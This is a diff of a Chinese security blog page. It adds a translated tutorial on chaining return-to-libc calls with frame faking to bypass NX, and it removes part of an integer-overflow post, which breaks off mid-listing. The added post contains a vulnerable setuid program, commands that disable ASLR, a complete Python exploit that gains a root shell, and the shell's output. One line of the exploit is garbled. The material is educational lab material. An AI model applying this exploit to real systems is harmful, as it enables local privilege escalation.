@@ -99,14 +99,6 @@
 </header>
 
 
-  <div style="background:#fff;width: 100%;">
-
-      <div style="max-height:600px; overflow: hidden;">
-        <img width="100%" alt="Hike News" src="/css/images/pose.jpg">
-      </div>
-
-  </div>
-
 
 
   <div id="container">
@@ -115,6 +107,134 @@
       <div id="content" class="outer">
         
           <section id="main">
+  
+    <article id="post-chainingreturntolibc"  class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      <a class="article-title" href="/20170101/chainingreturntolibc/">Return-to-libc链接绕过NX</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	Posted on <a href="/20170101/chainingreturntolibc/" class="article-date">
+	  <time datetime="2017-01-01T02:39:58.000Z" itemprop="datePublished">一月 1, 2017</time>
+	</a>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>作者: <a href="http://www.csyssec.org/about" target="_blank" rel="external">CSysSec出品</a></p>
+<hr>
+<p><strong>CSysSec注</strong>： 本系列文章译自安全自由工作者<a href="https://sploitfun.wordpress.com/about-2/" target="_blank" rel="external">Sploitfun</a>的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，本系列所有文章涉及的源码可以在<a href="https://github.com/sploitfun/lsploits" target="_blank" rel="external">这里</a>找到。CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170101/chainingreturntolibc" target="_blank" rel="external">Linux(X86)漏洞利用系列-Return-to-libc链接绕过NX</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
+<hr>
+<blockquote>
+<ul>
+<li>0x01 什么Return-to-libc链接</li>
+<li>0x02 什么是帧欺骗</li>
+<li>0x03 leave ret指令是如何调用其上方libc函数的</li>
+</ul>
+</blockquote>
+<p><u>阅读基础</u>:</p>
+<ul>
+<li>1.<a href="http://www.csyssec.org/20161230/stackbufferflow/" target="_blank" rel="external">经典栈缓冲区溢出</a></li>
+<li>2.<a href="http://www.csyssec.org/20161231/returntolibc/" target="_blank" rel="external">Return-to-libc绕过NX</a></li>
+</ul>
+<p><u>VM Setup</u>: Ubuntu 12.04(x86)</p>
+<h3 id="什么是Return-to-libc链接"><a href="#什么是Return-to-libc链接" class="headerlink" title="什么是Return-to-libc链接"></a>什么是Return-to-libc链接</h3><p>在<a href="http://www.csyssec.org/20161231/returntolibc/" target="_blank" rel="external">前文</a>中可以看出，攻击者需要调用多个libc函数才能成功利用漏洞。一种链接libc函数的简单方法就是将不同libc函数依次放在栈中。但由于函数参数的原因，这是不可能的。现在你可能还不明白，没关系，继续往下读就好。</p>
+<p><u>漏洞代码</u>:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//vuln.c</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</div><div class="line"> <span class="keyword">char</span> buf[<span class="number">256</span>];</div><div class="line"> seteuid(getuid()); <span class="comment">/* Temporarily drop privileges */</span></div><div class="line"> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);</div><div class="line"> <span class="built_in">printf</span>(<span class="string">"%s"</span>,buf);</div><div class="line"> fflush(<span class="built_in">stdout</span>);</div><div class="line"> <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><u>注意</u>: 上述代码和<a href="http://www.csyssec.org/20161231/returntolibc/" target="_blank" rel="external">前文</a>中的(vuln_priv.c)一样。</p>
+<p><u>编译命令</u>:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#echo 0 &gt; /proc/sys/kernel/randomize_va_space</span></div><div class="line">$gcc -fno-<span class="built_in">stack</span>-protector -g -o vuln vuln.c</div><div class="line">$sudo chown root vuln</div><div class="line">$sudo chgrp root vuln</div><div class="line">$sudo chmod +s vuln</div></pre></td></tr></table></figure>
+<p>正如<a href="http://www.csyssec.org/20161231/returntolibc/" target="_blank" rel="external">前文</a>所说，链接seteuid,system和exit函数能允许我们利用漏洞代码”vuln”。但并没有这么简单直接，主要在于下面这两个问题：</p>
+<ul>
+<li>1.攻击者需要将两个libc函数参数或者其中一个libc函数参数与另一个libc函数地址放在栈的同一位置。显然这是不可能的(如下图所示)</li>
+<li>2.seteuid_arg必须为0.由于我们的缓冲区溢出是由strcpy操作引起的，0变成了一个不好的字符。比如，strcpy函数不会将0之后的字符拷贝到栈中。</li>
+</ul>
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/chainreturntolibc1.jpeg" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/chainreturntolibc1.jpeg" width="450"></a><br>    <figcaption></figcaption><br></figure>
+
+<p>我们来看看如何解决上述两个问题。</p>
+<p><u>问题1</u>: 为解决这个问题，Nergal在<a href="http://phrack.org/issues/58/4.html" target="_blank" rel="external">phrack</a>中提出了两个聪明的技术</p>
+<ul>
+<li><ol>
+<li>ESP上升(ESP Lifting)</li>
+</ol>
+</li>
+<li><ol>
+<li>帧欺骗(Frame fakeing)</li>
+</ol>
+</li>
+</ul>
+<p>由于ESP lifting技术要求二进制文件在编译的时候不能设置帧指针(-fomit-frame-pointer)，这里我们只谈帧欺骗技术。 由于我们的二进制文件(vuln)含有帧指针，只好采用帧欺骗技术。</p>
+<h3 id="什么是帧欺骗"><a href="#什么是帧欺骗" class="headerlink" title="什么是帧欺骗"></a>什么是帧欺骗</h3><p>这项技术不去覆盖返回地址，而是直接覆盖libc函数地址(这个例子中的seteuid函数)，我们采用”leave ret”指令来覆盖。 这让攻击者有机会将函数参数存放在栈中而不必有任何交叉，而且能调用相应的libc函数，并不会带来任何问题。</p>
+<p><u>栈布局</u> 如下面栈布局所示，帧指针攻击者溢出栈并成功链接libc函数: seteuid, system与exit：</p>
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/chainreturntolibc2.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/chainreturntolibc2.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
+
+<p>上图中红色强调的部分是”leave ret”指令调用其上方libc函数的返回地址。举个例子，第一条”leave ret”指令(位于栈地址0xbffff1fc处)调用seteuid()，第二条”leave ret”指令(位于栈地址0xbffff20c处)调用system()，第三条”leave ret”指令(位于栈地址0xbffff21c处)调用exit().</p>
+<h3 id="leave-ret指令是如何调用其上方libc函数的"><a href="#leave-ret指令是如何调用其上方libc函数的" class="headerlink" title="leave ret指令是如何调用其上方libc函数的"></a>leave ret指令是如何调用其上方libc函数的</h3><p>为了回答这个问题，首先我们要了解”leave”指令。一条”leave”指令可以翻译成:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mov ebp,esp            <span class="comment">//esp = ebp</span></div><div class="line">pop ebp                <span class="comment">//ebp = *esp</span></div></pre></td></tr></table></figure>
+<p>我们来反汇编main()函数，以便更进一步了解“leave ret”指令</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">(gdb) disassemble main</div><div class="line">Dump of assembler code <span class="keyword">for</span> function main:</div><div class="line">  ...</div><div class="line">  <span class="number">0x0804851c</span> &lt;+<span class="number">88</span>&gt;: leave                  <span class="comment">//mov ebp, esp; pop ebp;</span></div><div class="line">  <span class="number">0x0804851d</span> &lt;+<span class="number">89</span>&gt;: ret                    <span class="comment">//return</span></div><div class="line">End of assembler dump.</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
+<p><u>Main尾声代码</u>:</p>
+<p>如上述栈布局所示，在main函数尾声代码执行之前，攻击者已经溢出栈并用fake_ebp0(0xbffff204)覆盖了main函数的ebp，以及利用”leave ret”指令地址(0x0804851c)覆盖了其返回地址。 现在当CPU要执行main函数的尾声代码时，EIP指向text地址0x0804851c（”leave ret”)。在执行过程中，会发生下面的事情：</p>
+<ul>
+<li>‘leave’修改了下面的寄存器<ul>
+<li>esp = ebp = 0xbffff1f8</li>
+<li>ebp = 0xbffff204, esp = 0xbffff1fc</li>
+</ul>
+</li>
+<li>‘ret’执行”leave ret”指令(位于栈地址0xbffff1fc处)</li>
+</ul>
+<p><u>seteuid</u>: 现在EIP又重新指向text地址0x0804851c(“leave ret”). 在执行过程中，会发生下面的事情：</p>
+<ul>
+<li>‘leave’修改了下面的寄存器<ul>
+<li>esp = ebp = 0xbffff204</li>
+<li>ebp = 0xbffff214, esp =0xbffff208</li>
+</ul>
+</li>
+<li>‘ret’执行seteuis()(位于栈地址0xbffff208). 为了能成功调用seteuid,seteuid_arg必须放在栈地址0xbffff210的偏移量8处(比如seteuid_add）</li>
+<li>调用seteuid()后，”leave ret”指令(位于栈地址0xbffff20c处)开始执行</li>
+</ul>
+<p>可以从上面的栈布局看出，执行上述过程，栈已经按照攻击者的意图设置好，system和exit函数都能得到执行。</p>
+<p><u>问题2</u>: 在我们的例子中，seteuid必须为0. 但0已经变成一个不好的字符，如何将0写在栈地址0xbffff210处呢？Nergal的同一篇文中讲了一个简单的方法。在链接libc相关函数时，前几个调用必须是strcp函数(其将一个NULL字节拷贝到seteuid_arg在栈中的位置)。</p>
+<p><u>注意</u>: 但不幸地是我的libc.so.6中strcpy函数的地址是0xb7ea6200。 libc函数地址本身包含一个NULL字节(不好的字符!)。 因此，strcpy不能成功地利用漏洞代码。sprintf（函数地址是0xb7e6e8d0)可以用来替代strcpy。使用sprintf时，NULL字节被拷贝到seteuid_arg在栈中的位置。</p>
+<p>因此链接下面的libc函数可以解决上面提到的两个问题并成功获取root shell:</p>
+<pre><code>sprintf|sprintf|sprintf|sprintf|seteuid|system|exit
+</code></pre><p><u>漏洞利用代码</u>:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#exp.py</span></div><div class="line">#!/usr/bin/env python</div><div class="line"><span class="keyword">import</span> <span class="keyword">struct</span></div><div class="line">from subprocess <span class="keyword">import</span> call</div><div class="line"></div><div class="line">fake_ebp0 = <span class="number">0xbffff1a0</span></div><div class="line">fake_ebp1 = <span class="number">0xbffff1b8</span></div><div class="line">fake_ebp2 = <span class="number">0xbffff1d0</span></div><div class="line">fake_ebp3 = <span class="number">0xbffff1e8</span></div><div class="line">fake_ebp4 = <span class="number">0xbffff204</span></div><div class="line">fake_ebp5 = <span class="number">0xbffff214</span></div><div class="line">fake_ebp6 = <span class="number">0xbffff224</span></div><div class="line">fake_ebp7 = <span class="number">0xbffff234</span></div><div class="line">leave_ret = <span class="number">0x0804851c</span></div><div class="line">sprintf_addr = <span class="number">0xb7e6e8d0</span></div><div class="line">seteuid_addr = <span class="number">0xb7f09720</span></div><div class="line">system_addr = <span class="number">0xb7e61060</span></div><div class="line">exit_addr = <span class="number">0xb7e54be0</span></div><div class="line">sprintf_arg1 = <span class="number">0xbffff210</span></div><div class="line">sprintf_arg2 = <span class="number">0x80485f0</span></div><div class="line">sprintf_arg3 = <span class="number">0xbffff23c</span></div><div class="line">system_arg = <span class="number">0x804829d</span></div><div class="line">exit_arg = <span class="number">0xffffffff</span></div><div class="line"></div><div class="line">#endianess convertion</div><div class="line">def conv(num):</div><div class="line"> <span class="keyword">return</span> <span class="keyword">struct</span>.pack(<span class="string">"&lt;I"</span>,num* <span class="number">264</span> </div><div class="line">buf += conv(fake_ebp0) </div><div class="line">buf += conv(leave_ret) </div><div class="line">#Below four <span class="built_in">stack</span> frames are <span class="keyword">for</span> <span class="built_in">sprintf</span> (to setup seteuid arg )</div><div class="line">buf += conv(fake_ebp1) </div><div class="line">buf += conv(sprintf_addr) </div><div class="line">buf += conv(leave_ret) </div><div class="line">buf += conv(sprintf_arg1) </div><div class="line">buf += conv(sprintf_arg2) </div><div class="line">buf += conv(sprintf_arg3) </div><div class="line">buf += conv(fake_ebp2) </div><div class="line">buf += conv(sprintf_addr) </div><div class="line">buf += conv(leave_ret) </div><div class="line">sprintf_arg1 += <span class="number">1</span></div><div class="line">buf += conv(sprintf_arg1) </div><div class="line">buf += conv(sprintf_arg2) </div><div class="line">buf += conv(sprintf_arg3) </div><div class="line">buf += conv(fake_ebp3) </div><div class="line">buf += conv(sprintf_addr) </div><div class="line">buf += conv(leave_ret) </div><div class="line">sprintf_arg1 += <span class="number">1</span></div><div class="line">buf += conv(sprintf_arg1) </div><div class="line">buf += conv(sprintf_arg2) </div><div class="line">buf += conv(sprintf_arg3) </div><div class="line">buf += conv(fake_ebp4) </div><div class="line">buf += conv(sprintf_addr) </div><div class="line">buf += conv(leave_ret) </div><div class="line">sprintf_arg1 += <span class="number">1</span></div><div class="line">buf += conv(sprintf_arg1) </div><div class="line">buf += conv(sprintf_arg2) </div><div class="line">buf += conv(sprintf_arg3)</div><div class="line">#Dummy - To avoid null byte in fake_ebp4. </div><div class="line">buf += <span class="string">"X"</span> * <span class="number">4</span> </div><div class="line">#Below <span class="built_in">stack</span> frame is <span class="keyword">for</span> seteuid</div><div class="line">buf += conv(fake_ebp5) </div><div class="line">buf += conv(seteuid_addr) </div><div class="line">buf += conv(leave_ret) </div><div class="line">#Dummy - This arg is zero'd by above four <span class="built_in">sprintf</span> calls</div><div class="line">buf += <span class="string">"Y"</span> * <span class="number">4</span> </div><div class="line">#Below <span class="built_in">stack</span> frame is <span class="keyword">for</span> system</div><div class="line">buf += conv(fake_ebp6) </div><div class="line">buf += conv(system_addr) </div><div class="line">buf += conv(leave_ret) </div><div class="line">buf += conv(system_arg) </div><div class="line">#Below <span class="built_in">stack</span> frame is <span class="keyword">for</span> <span class="built_in">exit</span></div><div class="line">buf += conv(fake_ebp7) </div><div class="line">buf += conv(exit_addr) </div><div class="line">buf += conv(leave_ret) </div><div class="line">buf += conv(exit_arg) </div><div class="line"></div><div class="line">print <span class="string">"Calling vulnerable program"</span></div><div class="line">call([<span class="string">"./vuln"</span>, buf])</div></pre></td></tr></table></figure>
+<p>执行上面的漏洞利用代码就可以拿到root shell!!!</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ python <span class="built_in">exp</span>.py </div><div class="line">Calling vulnerable program</div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�����������������\��������������\��������������\�������������\��� �������AAAA0�������Ѕ</div><div class="line"><span class="meta"># id</span></div><div class="line">uid=<span class="number">1000</span>(sploitfun) gid=<span class="number">1000</span>(sploitfun) euid=<span class="number">0</span>(root) egid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root),<span class="number">4</span>(adm),<span class="number">24</span>(cdrom),<span class="number">27</span>(sudo),<span class="number">30</span>(dip),<span class="number">46</span>(plugdev),<span class="number">109</span>(lpadmin),<span class="number">124</span>(sambashare),<span class="number">1000</span>(sploitfun)</div><div class="line"># <span class="built_in">exit</span></div><div class="line">$</div></pre></td></tr></table></figure>
+<p>现在已经成功绕过NX,<a href="http://www.csyssec.org/20170101/bypassaslr-returntoplt/" target="_blank" rel="external">下一篇</a>文章让我们来看看如果绕过ASLR.</p>
+<hr>
+<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170101/chainingreturntolibc" target="_blank" rel="external">Linux(X86)漏洞利用系列-Return-to-libc链接绕过NX</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
+
+      
+    </div>
+    <footer class="entry-meta entry-footer">
+      
+	<span class="ico-folder"></span>
+    <a class="article-category-link" href="/categories/漏洞利用/">漏洞利用</a>
+
+      
+  <span class="ico-tags"></span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li></ul>
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+<!-- Table of Contents -->
+
   
     <article id="post-returntolibc"  class="article article-type-post" itemscope itemprop="blogPost" >
   <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
@@ -874,106 +994,6 @@ $ echo $?
 <!-- Table of Contents -->
 
   
-    <article id="post-integerflow"  class="article article-type-post" itemscope itemprop="blogPost" >
-  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/20161230/integerflow/">整型溢出利用</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      
-	Posted on <a href="/20161230/integerflow/" class="article-date">
-	  <time datetime="2016-12-30T09:58:52.000Z" itemprop="datePublished">十二月 30, 2016</time>
-	</a>
-
-    </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>作者：<a href="http://www.csyssec.org/" target="_blank" rel="external">CSysSec出品</a></p>
-<hr>
-<p><strong>CSysSec注</strong>： 本系列文章译自安全自由工作者<a href="https://sploitfun.wordpress.com/about-2/" target="_blank" rel="external">Sploitfun</a>的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，本系列所有文章涉及的源码可以在<a href="https://github.com/sploitfun/lsploits" target="_blank" rel="external">这里</a>找到。CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20161230/integerflow/" target="_blank" rel="external">Linux(X86)漏洞利用系列-整型溢出利用</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
-<hr>
-<blockquote>
-<ul>
-<li>0X01 什么是整型上溢出（Integer Overflow）</li>
-<li>0X02 整型下溢出（Integer underflow）</li>
-<li>0X03 利用整型溢出漏洞</li>
-</ul>
-</blockquote>
-<p><u><em>VM Setup: Ubuntu 12.04 (x86)</em></u></p>
-<p><strong>注：本文中overflow指上溢出，underflow指下溢出。默认情况下，溢出指的都是上溢出。</strong></p>
-<h3 id="0X01-什么是整型上溢出"><a href="#0X01-什么是整型上溢出" class="headerlink" title="0X01 什么是整型上溢出"></a>0X01 什么是整型上溢出</h3><p>存储的数值大于支持的最大上限值，即为整型溢出。整型溢出本身不会直接导致任意代码执行，但是它会导致栈溢出或堆溢出，而后两者都会导致任意代码执行。本文我只谈论导致栈溢出的整型溢出，而导致堆溢出的整型溢出我会放在以后的文章中单独讲。</p>
-<p>数据类型大小和范围：</p>
-<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/leve1integer1.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/leve1integer1.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
-
-<p>当我们要存储的数值大于支持的最大上限值时，数值就会错乱。打个比方，如果我们把2147483648存进有符号整型数据，那么这串数字就会错乱，其值会变为-21471483648。这就叫做整型溢出，并且这种溢出有可能导致任意代码执行。</p>
-<h3 id="0X02-整型下溢出（Integer-underflow）"><a href="#0X02-整型下溢出（Integer-underflow）" class="headerlink" title="0X02 整型下溢出（Integer underflow）"></a>0X02 整型下溢出（Integer underflow）</h3><p>与整型上溢出类似，存储数值小于支持的最小下限值，即为整型下溢出。打个比方，如果我们把-2147483649存进有符号整型数据，那么这串数字就会错乱，其值会变为21471483647。这就叫做整型下溢出。本文中我虽然只讲整型上溢出，但是同样的技术也适用于整型下溢出。</p>
-<p><u><em>漏洞代码：</em></u></p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//vuln.c</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">store_passwd_indb</span><span class="params">(<span class="keyword">char</span>* passwd)</span> </span>&#123;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">validate_uname</span><span class="params">(<span class="keyword">char</span>* uname)</span> </span>&#123;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">validate_passwd</span><span class="params">(<span class="keyword">char</span>* passwd)</span> </span>&#123;</div><div class="line"> <span class="keyword">char</span> passwd_buf[<span class="number">11</span>];</div><div class="line"> <span class="keyword">unsigned</span> <span class="keyword">char</span> passwd_len = <span class="built_in">strlen</span>(passwd); <span class="comment">/* [1] */</span> </div><div class="line"> <span class="keyword">if</span>(passwd_len &gt;= <span class="number">4</span> &amp;&amp; passwd_len &lt;= <span class="number">8</span>) &#123; <span class="comment">/* [2] */</span></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Valid Password\n"</span>); <span class="comment">/* [3] */</span> </div><div class="line">  fflush(<span class="built_in">stdout</span>);</div><div class="line">  <span class="built_in">strcpy</span>(passwd_buf,passwd); <span class="comment">/* [4] */</span></div><div class="line"> &#125; <span class="keyword">else</span> &#123;</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Invalid Password\n"</span>); <span class="comment">/* [5] */</span></div><div class="line">  fflush(<span class="built_in">stdout</span>);</div><div class="line"> &#125;</div><div class="line"> store_passwd_indb(passwd_buf); <span class="comment">/* [6] */</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</div><div class="line"> <span class="keyword">if</span>(argc!=<span class="number">3</span>) &#123;</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Usage Error:   \n"</span>);</div><div class="line">  fflush(<span class="built_in">stdout</span>);</div><div class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</div><div class="line"> &#125;</div><div class="line"> validate_uname(argv[<span class="number">1</span>]);</div><div class="line"> validate_passwd(argv[<span class="number">2</span>]);</div><div class="line"> <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p><u><em>编译命令：</em></u></p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#echo 0 &gt; /proc/sys/kernel/randomize_va_space</span></div><div class="line">$gcc -g -fno-<span class="built_in">stack</span>-protector -z execstack -o vuln vuln.c</div><div class="line">$sudo chown root vuln</div><div class="line">$sudo chgrp root vuln</div><div class="line">$sudo chmod +s vuln</div></pre></td></tr></table></figure>
-<p>上述漏洞程序的第[1]行存在整型溢出。strlen()返回的类型是size_t（无符号整型），却被存储在无符号字符串类型中。因此，任意超过无符号字符串数据类型支持的最大上限值的数据都会导致整型溢出。这样一来，当密码长度为261时，261就会被错乱存储在‘passwd_len’变量中，值会变为5。正是由于这种整型溢出漏洞，第[2]行执行的边界检查才能被绕过，从而导致栈缓冲区溢出！而在<a href="http://www.csyssec.org/20161230/stackbufferflow/" target="_blank" rel="external">这一篇</a>文章中我们知道，栈缓冲区溢出会导致任意程序执行。</p>
-<p>为了让大家更好地理解漏洞利用代码，我们在对它做进一步的分析之前，先来反汇编并画出漏洞代码的堆栈布局吧！</p>
-<p><u><em>反汇编：</em></u></p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line">(gdb) disassemble validate_passwd </div><div class="line">Dump of assembler code <span class="keyword">for</span> function validate_passwd:</div><div class="line"> <span class="comment">//Function Prologue</span></div><div class="line"> <span class="number">0x0804849e</span> &lt;+<span class="number">0</span>&gt;: push %ebp                               <span class="comment">//backup caller's ebp</span></div><div class="line"> <span class="number">0x0804849f</span> &lt;+<span class="number">1</span>&gt;: mov %esp,%ebp                           <span class="comment">//set callee's ebp to esp</span></div><div class="line"></div><div class="line"> <span class="number">0x080484a1</span> &lt;+<span class="number">3</span>&gt;: push %edi                               <span class="comment">//backup edi</span></div><div class="line"> <span class="number">0x080484a2</span> &lt;+<span class="number">4</span>&gt;: sub $<span class="number">0x34</span>,%esp                          <span class="comment">//stack space for local variables</span></div><div class="line"> <span class="number">0x080484a5</span> &lt;+<span class="number">7</span>&gt;: mov <span class="number">0x8</span>(%ebp),%eax                      <span class="comment">//eax = passwd</span></div><div class="line"> <span class="number">0x080484a8</span> &lt;+<span class="number">10</span>&gt;: movl $<span class="number">0xffffffff</span>,<span class="number">-0x1c</span>(%ebp)           <span class="comment">//String Length Calculation -- Begins here</span></div><div class="line"> <span class="number">0x080484af</span> &lt;+<span class="number">17</span>&gt;: mov %eax,%edx</div><div class="line"> <span class="number">0x080484b1</span> &lt;+<span class="number">19</span>&gt;: mov $<span 